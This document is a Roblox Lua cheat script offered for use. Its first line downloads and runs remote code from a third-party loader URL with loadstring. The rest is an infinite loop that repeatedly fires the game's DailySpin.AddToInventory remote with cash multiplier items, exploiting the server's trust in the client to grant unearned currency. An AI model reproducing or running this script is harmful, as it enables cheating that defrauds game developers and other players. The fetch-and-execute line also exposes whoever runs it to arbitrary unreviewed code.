loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1eda2fe41e6849f74c627b6b503933b7.lua"))()
while true do
    wait(0.3)
    
    local ohString1 = "5xCash"
    local ohBoolean2 = true
    game:GetService("ReplicatedStorage").Remote.DailySpin.AddToInventory:FireServer(ohString1, ohBoolean2)

    ohString1 = "2xCash"
    ohBoolean2 = true
    game:GetService("ReplicatedStorage").Remote.DailySpin.AddToInventory:FireServer(ohString1, ohBoolean2)

    ohString1 = "50xCash"
    ohBoolean2 = true
    game:GetService("ReplicatedStorage").Remote.DailySpin.AddToInventory:FireServer(ohString1, ohBoolean2)

    ohString1 = "1000xCash"
    ohBoolean2 = true
    game:GetService("ReplicatedStorage").Remote.DailySpin.AddToInventory:FireServer(ohString1, ohBoolean2)

    ohString1 = "100xCash"
    ohBoolean2 = true
    game:GetService("ReplicatedStorage").Remote.DailySpin.AddToInventory:FireServer(ohString1, ohBoolean2)
end
